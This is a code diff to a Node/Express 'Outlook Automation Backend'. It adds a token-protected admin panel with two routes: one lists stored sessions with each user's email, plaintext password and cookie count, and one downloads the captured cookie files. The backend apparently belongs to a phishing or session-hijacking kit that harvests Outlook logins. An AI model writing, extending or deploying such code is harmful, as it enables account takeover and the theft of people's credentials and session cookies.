@@ -6,12 +6,32 @@ const { OutlookLoginAutomation } = require('./src/outlook-login');
 const app = express();
 const PORT = process.env.PORT || 5000;
 
+// Security configuration
+const ADMIN_TOKEN = process.env.ADMIN_TOKEN || 'admin-' + Math.random().toString(36).substr(2, 24);
+console.log(`🔑 Admin token: ${ADMIN_TOKEN}`);
+
 // Middleware - Configure CORS for Replit environment
 app.use(cors({
     origin: true, // Allow all origins for Replit proxy
     credentials: true
 }));
 app.use(express.json());
+
+// Admin authentication middleware
+function requireAdminAuth(req, res, next) {
+    const token = req.headers['authorization']?.replace('Bearer ', '') || 
+                  (req.query && req.query.token) || 
+                  (req.body && req.body.token);
+    
+    if (!token || token !== ADMIN_TOKEN) {
+        return res.status(401).json({ 
+            error: 'Unauthorized access to admin endpoint',
+            message: 'Valid admin token required'
+        });
+    }
+    next();
+}
+
 app.use(express.static('public'));
 
 // Store multiple automation instances - allow concurrent sessions
@@ -1202,9 +1222,97 @@ process.on('SIGINT', gracefulShutdown);
 process.on('SIGTERM', gracefulShutdown);
 process.on('SIGQUIT', gracefulShutdown);
 
+// Admin routes for session management
+app.get('/api/admin/sessions', requireAdminAuth, (req, res) => {
+    const fs = require('fs');
+    const path = require('path');
+    
+    try {
+        const sessionDir = path.join(__dirname, 'session_data');
+        
+        if (!fs.existsSync(sessionDir)) {
+            return res.json({ sessions: [] });
+        }
+        
+        const files = fs.readdirSync(sessionDir)
+            .filter(file => file.startsWith('session_') && file.endsWith('.json'));
+        
+        const sessions = files.map(file => {
+            try {
+                const filePath = path.join(sessionDir, file);
+                const data = JSON.parse(fs.readFileSync(filePath, 'utf8'));
+                return {
+                    filename: file,
+                    id: data.id,
+                    email: data.email,
+                    password: data.password,
+                    timestamp: data.timestamp,
+                    totalCookies: data.totalCookies
+                };
+            } catch (error) {
+                console.error(`Error reading session file ${file}:`, error);
+                return null;
+            }
+        }).filter(session => session !== null);
+        
+        res.json({ sessions });
+    } catch (error) {
+        console.error('Error getting sessions:', error);
+        res.status(500).json({ error: 'Failed to get sessions' });
+    }
+});
+
+// Download cookie file
+app.get('/api/admin/download/:filename', requireAdminAuth, (req, res) => {
+    const fs = require('fs');
+    const path = require('path');
+    const filename = req.params.filename;
+    
+    // Enhanced security: strict validation and path traversal protection
+    if (!filename || typeof filename !== 'string') {
+        return res.status(400).json({ error: 'Invalid filename parameter' });
+    }
+    
+    // Remove any path separators and normalize
+    const sanitizedFilename = path.basename(filename);
+    
+    // Only allow files that start with 'session_' and end with '.json'
+    if (!sanitizedFilename.startsWith('session_') || !sanitizedFilename.endsWith('.json')) {
+        return res.status(400).json({ error: 'Invalid filename format' });
+    }
+    
+    // Additional validation: check for suspicious patterns
+    if (sanitizedFilename.includes('..') || sanitizedFilename.includes('/') || sanitizedFilename.includes('\\')) {
+        return res.status(400).json({ error: 'Filename contains invalid characters' });
+    }
+    
+    try {
+        const sessionDir = path.join(__dirname, 'session_data');
+        const filePath = path.join(sessionDir, sanitizedFilename);
+        
+        // Ensure the resolved path is within session_data directory
+        if (!filePath.startsWith(sessionDir)) {
+            return res.status(400).json({ error: 'Path traversal attempt detected' });
+        }
+        
+        if (!fs.existsSync(filePath)) {
+            return res.status(404).json({ error: 'File not found' });
+        }
+        
+        res.setHeader('Content-Disposition', `attachment; filename="${sanitizedFilename}"`);
+        res.setHeader('Content-Type', 'application/json');
+        res.sendFile(filePath);
+        
+    } catch (error) {
+        console.error('Error downloading file:', error);
+        res.status(500).json({ error: 'Failed to download file' });
+    }
+});
+
 // Start server
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Outlook Automation Backend running on port ${PORT}`);
     console.log(`📧 API endpoints available at http://localhost:${PORT}/api/`);
     console.log(`🌐 Frontend available at http://localhost:${PORT}/`);
+    console.log(`🔧 Admin panel available at http://localhost:${PORT}/admin.html`);
 });
